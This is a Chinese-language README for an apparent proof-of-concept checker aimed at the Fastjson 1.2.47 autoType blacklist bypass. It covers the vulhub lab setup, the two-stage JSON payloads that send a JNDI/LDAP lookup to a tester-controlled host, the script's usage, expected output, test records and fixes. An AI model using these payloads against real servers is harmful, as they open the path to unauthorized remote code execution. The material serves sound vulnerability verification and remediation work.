# Fastjson 1.2.47 反序列化白名单绕过（无 CVE 编号）

| 项 | 内容 |
|---|---|
| CVE | 无（厂商未分配，参考 360 CERT 公告） |
| 产品 / 版本 | Fastjson `1.2.25` ~ `1.2.47`（1.2.48 修复） |
| 漏洞类型 | `Deserialization`（autoType 绕过 → JNDI 注入 → RCE） |
| 危害 | 未授权远程代码执行 |
| 前置条件 | 无需认证；目标使用受影响版本 fastjson 解析请求体 |
| 验证方式 | 两段式 payload + JNDI 外连回调 |
| 破坏性 | 无：不提供 LDAP/RMI 服务、不加载远程类、不执行命令 |

## 版本说明（重要）

本目录按靶场场景命名为 `1.2.47`，但 **vulhub 的 1.2.47 靶场镜像 `vulhub/fastjson:1.2.45` 实际打包的是 1.2.45 的 jar**——这是 vulhub 的刻意选择，因为该绕过影响 `1.2.25` 到 `1.2.47` 整个区间，1.2.48 才修复。

核验方式：`docker ps` 显示容器 `1247-rce-web-1` 使用镜像 `vulhub/fastjson:1.2.45`。所以判断目标是否受影响应看实际 jar 版本，而不是靶场目录名。

## 漏洞描述

Fastjson 从 1.2.25 起为 autoType 增加了黑名单，禁止直接实例化危险类。但在 1.2.48 之前，攻击者可以先用 `@type` 指定 `java.lang.Class`，把 `com.sun.rowset.JdbcRowSetImpl` 这类被拉黑的类**预先加载进 fastjson 的内部缓存**；随后再用 `@type` 引用它时，缓存命中会跳过黑名单校验。

`JdbcRowSetImpl` 的 `setAutoCommit()` 会用 `dataSourceName` 字段发起 JNDI 查询，把它指向攻击者控制的 LDAP/RMI 服务即可加载远程类并执行命令。

## 影响版本

- 受影响：`1.2.25` ~ `1.2.47`（黑名单已存在但可绕过）
- 不受影响：`>= 1.2.48`（修复了 Class 缓存绕过）；开启 `safeMode` 的任意版本
- 更早的 `<= 1.2.24` 属另一条路径：无黑名单，直接打，见同仓库 `Fastjson-1.2.24-...`

## 验证原理

脚本不实现恶意 LDAP 服务，只做**外连验证**：

1. 本机监听 `--lport`（默认 1389）
2. step1 发送预加载请求，把类塞进缓存：

```json
{"user": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}}
```

3. step2 发送引用请求，触发 JNDI 查询：

```json
{
  "user": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://<你的IP>:1389/Exploit",
    "autoCommit": true
  }
}
```

4. 收到目标回连即判定存在漏洞。因为没有实现 LDAP 协议，目标随后返回 400/500 属预期。

注入点为请求体的 `user.@type`：该靶场控制器把请求体绑定到固定 bean，顶层直接放 `@type` 会被拒绝。

## 使用方法

```bash
# 最简（自动探测回连 IP）
python3 poc.py -u http://target:8090/

# 推荐：显式指定回连地址（多网卡机器必填）
python3 poc.py -u http://target:8090/ --lhost 10.0.0.11

# 端口冲突时换端口、延长等待
python3 poc.py -u http://target:8090/ --lhost 10.0.0.11 --lport 13899 -w 20
```

| 参数 | 说明 | 默认 |
|---|---|---|
| `-u/--url` | 目标地址（必填） | — |
| `--lhost` | 目标可回连的本机 IP | 自动探测 |
| `--lport` | 本地监听端口 | 1389 |
| `-t/--timeout` | 单次请求超时（秒） | 8 |
| `-w/--wait` | 等待回调时长（秒） | 14 |
| `-k/--insecure` | 跳过 TLS 校验 | 关闭 |

退出码：`0` 存在 / `1` 不存在 / `2` 参数或网络错误。

## 预期输出

```text
[目标]    http://10.0.0.13:8090/
[注入点]  JSON 请求体 user.@type (两段式: 类缓存 -> JNDI 实例化)
[Payload] step1 {...java.lang.Class...}
          step2 {...JdbcRowSetImpl...}
[监听]    10.0.0.15:1389 (等待目标 JNDI 外连)
[响应]    step1 HTTP 200, body: { "age":20 }
[响应]    step2 HTTP 400, body: {..."message":"JSON parse error: set property error, autoCommit"...}
[回调]    10.0.0.13 -> 10.0.0.15:1389 连接成功
[结论]    VULNERABLE - Fastjson 1.2.47 反序列化绕过 (无 CVE 编号)
```

## 实测记录与一个注意点

在 `vulhub/fastjson:1.2.45` 这个镜像上，**直打 1.2.24 的 payload 同样能触发回调**——说明该 jar 并未拦截 `JdbcRowSetImpl`。因此：

- 本脚本用两段式，在真正的 1.2.25~1.2.47 上仍然有效
- 但不能用「直打是否成功」来区分 1.2.24 和 1.2.47，版本判定要看镜像/jar 实际版本

## 修复建议

- 升级到 `1.2.48+`（建议直接上 2.x）；仅升级到 1.2.47 无效
- 开启 `safeMode`：`ParserConfig.getGlobalInstance().setSafeMode(true)`
- 关闭 autoType：`ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`
- 业务侧改用 `JSON.parseObject(str, 具体类.class)` 并做字段白名单
- 网络层阻断出站 LDAP(389/636/1389)/RMI(1099) 流量

## 参考链接

- Vulhub 环境：https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce
- 360 CERT 公告：https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
- 分析文章：https://www.freebuf.com/vuls/208339.html

## 验证记录

| 日期 | 环境 | 结果 |
|---|---|---|
| 2026-10-24 | vulhub `1247-rce-web-1`（镜像 `vulhub/fastjson:1.2.45`），`10.0.0.13:8090` | VULNERABLE，step1 200 / step2 400，收到 `10.0.0.13` 回调，退出码 0 |
| 2026-10-24 | 本地 JSON 回显服务（阴性对照） | NOT VULNERABLE，无回调，退出码 1 |
| 2026-10-24 | 不可达端口 `10.0.0.13:9` | ERROR，退出码 2 |
